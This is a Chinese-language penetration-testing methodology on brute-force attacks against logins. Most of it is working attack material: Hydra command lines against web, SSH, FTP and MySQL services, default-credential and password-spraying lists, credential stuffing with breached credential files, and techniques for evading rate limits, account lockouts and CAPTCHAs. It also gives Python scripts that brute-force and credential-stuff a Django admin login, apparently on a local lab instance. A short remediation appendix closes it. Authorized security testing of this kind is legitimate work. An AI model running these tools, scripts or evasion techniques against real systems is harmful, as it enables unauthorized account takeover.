# 暴力破解攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的暴力破解攻击检测与利用流程，帮助发现和利用弱口令、默认凭证等认证漏洞。

## 1.2 适用范围

本文档适用于所有存在用户认证机制的 Web 应用、API 接口、网络服务和设备。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

暴力破解攻击是指攻击者通过系统化地尝试大量用户名/密码组合，试图找到正确的凭证来获得未授权访问。

**本质问题**：
- 弱密码策略
- 缺少速率限制
- 缺少账户锁定机制
- 默认凭证未修改

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-307 | 认证机制缺陷 |
| CWE-259 | 使用硬编码密码 |
| CWE-521 | 弱密码要求 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户登录 | Web 登录表单 | 无速率限制 |
| API 认证 | API 密钥/Token | 弱密钥可爆破 |
| 管理后台 | 管理员登录 | 默认凭证 |
| SSH/RDP | 远程登录服务 | 弱口令 |
| 数据库 | 数据库登录 | 默认/弱口令 |
| 邮件服务 | SMTP/IMAP 登录 | 弱口令 |

## 2.3 漏洞发现方法

### 2.3.1 速率限制检测

```bash
# 快速发送多个请求，观察响应
for i in {1..10}; do
    curl -X POST https://target.com/login \
        -d "username=admin&password=test$i"
done

# 检查是否有：
# - 请求被限制（429 状态码）
# - 响应时间增加
# - CAPTCHA 出现
# - IP 被封禁
```

### 2.3.2 账户枚举检测

```bash
# 测试不同用户名的响应差异
curl -X POST https://target.com/login -d "username=existing_user&password=wrong"
curl -X POST https://target.com/login -d "username=nonexistent&password=wrong"

# 检查响应差异：
# - 状态码不同
# - 错误消息不同
# - 响应时间不同
# - 响应长度不同
```

### 2.3.3 默认凭证检测

```bash
# 常见默认凭证组合
admin:admin
admin:password
admin:123456
root:root
root:toor
test:test
user:user
```

## 2.4 漏洞利用方法

### 2.4.1 Hydra 暴力破解

```bash
# HTTP 表单登录
hydra -l admin -P passwords.txt https://target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# HTTP 基本认证
hydra -l admin -P passwords.txt https://target.com http-get

# SSH
hydra -l root -P passwords.txt ssh://target.com

# FTP
hydra -l anonymous -P passwords.txt ftp://target.com

# MySQL
hydra -l root -P passwords.txt mysql://target.com

# 指定端口
hydra -l admin -P passwords.txt -s 8080 https://target.com http-post-form "/login:user=^USER^&pass=^PASS^:error"
```

### 2.4.2 Burp Suite Intruder

**配置步骤**：

1. 捕获登录请求，发送到 Intruder
2. 设置 Payload 位置（用户名/密码）
3. 选择攻击类型（Sniper, Battering ram, Pitchfork, Cluster bomb）
4. 加载字典文件
5. 开始攻击，分析响应

**攻击类型选择**：

| 类型 | 说明 | 适用场景 |
|-----|------|---------|
| Sniper | 单个 Payload 集，依次测试 | 单参数测试 |
| Battering ram | 单个 Payload 集，同时填充所有位置 | 用户名=密码场景 |
| Pitchfork | 多个 Payload 集，一一对应 | 已知用户名列表 |
| Cluster bomb | 多个 Payload 集，全组合 | 完整暴力破解 |

### 2.4.3 凭证填充攻击

```bash
# 使用泄露的凭证列表
# 格式：username:password

# 使用 Burp Suite
# 1. 导入凭证列表到 Intruder
# 2. 设置用户名和密码参数
# 3. 使用 Pitchfork 模式

# 使用自定义脚本
python credential_stuffing.py --target https://target.com/login --creds breached_credentials.txt
```

### 2.4.4 密码喷洒攻击

```bash
# 使用少量常见密码尝试大量用户
# 避免触发账户锁定

# 常见密码列表
Winter2025
Spring2025
Summer2025
Fall2025
Password1
Welcome1
123456
qwerty

# 使用 Spray 工具
git clone https://github.com/Greenwolf/spray
python spray.py -t https://target.com/login -u users.txt -p passwords.txt
```

## 2.5 漏洞利用绕过方法

### 2.5.1 速率限制绕过

**技巧 1：IP 轮换**

```bash
# 使用代理池
hydra -l admin -P passwords.txt \
    -X "proxy=http://proxy1:8080" \
    https://target.com http-post-form "/login:..."

# 每 N 次请求更换代理
```

**技巧 2：慢速攻击**

```bash
# 在请求间添加延迟
hydra -l admin -P passwords.txt \
    -w 5  # 5 秒超时
    https://target.com http-post-form "/login:..."
```

**技巧 3：User-Agent 变换**

```bash
# 每次请求使用不同的 User-Agent
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)
```

### 2.5.2 账户锁定绕过

**技巧 4：密码轮换**

```bash
# 对每个用户尝试少量密码
# 避免触发锁定阈值

# 用户 1: 尝试 Password1, Password2, Password3
# 用户 2: 尝试 Password1, Password2, Password3
# ...
```

**技巧 5：用户名变形**

```bash
# 尝试用户名变体
admin
admin@domain.com
DOMAIN\\admin
admin#
_admin
```

### 2.5.3 CAPTCHA 绕过

**技巧 6：CAPTCHA 识别**

```bash
# 使用 OCR 工具
# 使用打码平台
# 使用深度学习模型
```

**技巧 7：CAPTCHA 绕过**

```bash
# 尝试重用 CAPTCHA
# 尝试空 CAPTCHA
# 尝试固定值
# 寻找未启用 CAPTCHA 的端点
```

### 2.5.4 Django 认证暴力破解专项

**场景**：Django 应用无速率限制、无 CAPTCHA 保护

**典型漏洞配置**（`/app/webapp/settings.py`）：
```python
# 缺失的配置
# MIDDLEWARE 中无 rate limiting 中间件
# INSTALLED_APPS 中无 CAPTCHA 应用
# LOGGING 未配置认证失败日志
```

**利用步骤 1：CSRF Token 提取**
```bash
curl -c cookies.txt -b cookies.txt http://localhost:45121/admin/login/ \
  | grep csrfmiddlewaretoken | sed -n 's/.*value="\([^"]*\).*/\1/p'
```

**利用步骤 2：自动化暴力破解脚本**
```python
import requests
import time

url = "http://localhost:45121/admin/login/"
session = requests.Session()

# 获取 CSRF token
response = session.get(url)
csrf_token = session.cookies.get('csrftoken')

# 执行 50 次连续登录尝试
for i in range(50):
    data = {
        'username': 'admin',
        'password': f'password{i}',
        'csrfmiddlewaretoken': csrf_token,
        'next': '/admin/'
    }

    start = time.time()
    response = session.post(url, data=data)
    elapsed = time.time() - start

    print(f"Attempt {i+1}: Status={response.status_code}, Time={elapsed:.3f}s")
    
    # 检查是否登录成功
    if response.status_code == 302:
        print(f"[+] Success! Password: password{i}")
        break
```

**利用步骤 3：凭证填充攻击**
```python
# 使用泄露的凭证列表进行填充攻击
def credential_stuffing(credentials_file):
    with open(credentials_file, 'r') as f:
        for line in f:
            username, password = line.strip().split(':')
            
            session = requests.Session()
            response = session.get(url)
            csrf_token = session.cookies.get('csrftoken')
            
            data = {
                'username': username,
                'password': password,
                'csrfmiddlewaretoken': csrf_token
            }
            
            response = session.post(url, data=data)
            
            if response.status_code == 302:
                print(f"[+] Valid credentials: {username}:{password}")
                return username, password
    
    return None, None
```

**性能指标**：
- 50 次请求在 1.8 秒内完成
- 平均响应时间：36ms
- 请求速率：27.7 请求/秒
- 无 429/403 响应（无速率限制）

**组合攻击**：
```
1. 无速率限制 → 高速暴力破解
2. 无 CAPTCHA → 完全自动化
3. 无日志记录 → 攻击不被发现
4. HTTP 明文传输 → 凭证可被拦截
```

---

# 第三部分：附录

## 3.1 常用密码字典

| 字典名称 | 用途 | 大小 |
|---------|------|------|
| rockyou.txt | 通用密码字典 | ~1400 万 |
| SecLists | 综合字典集 | 多种尺寸 |
| common-passwords.txt | 常见密码 | ~1000 |
| weak-passwords.txt | 弱密码 | ~500 |

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Hydra | 多协议暴力破解 | https://github.com/vanhauser-thc/thc-hydra |
| Burp Suite Intruder | Web 暴力破解 | https://portswigger.net/burp |
| Medusa | 并行暴力破解 | https://github.com/jmk-foofus/medusa |
| Ncrack | 网络认证破解 | https://github.com/nmap/ncrack |
| Hashcat | 哈希破解 | https://hashcat.net/hashcat/ |
| John the Ripper | 密码破解 | https://www.openwall.com/john/ |

## 3.3 修复建议

1. **实施多因素认证（MFA）**
2. **使用强密码策略** - 最小长度、复杂度要求
3. **实施速率限制** - 限制登录尝试频率
4. **实施账户锁定** - 多次失败后锁定账户
5. **使用 CAPTCHA** - 防止自动化攻击
6. **监控异常登录** - 检测暴力破解行为
7. **禁止默认凭证** - 强制修改默认密码

---

**参考资源**：
- [OWASP Cheat Sheet: Authentication](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP ASVS V2 Authentication](https://owasp.org/www-project-application-security-verification-standard/)
- [Have I Been Pwned](https://haveibeenpwned.com/)
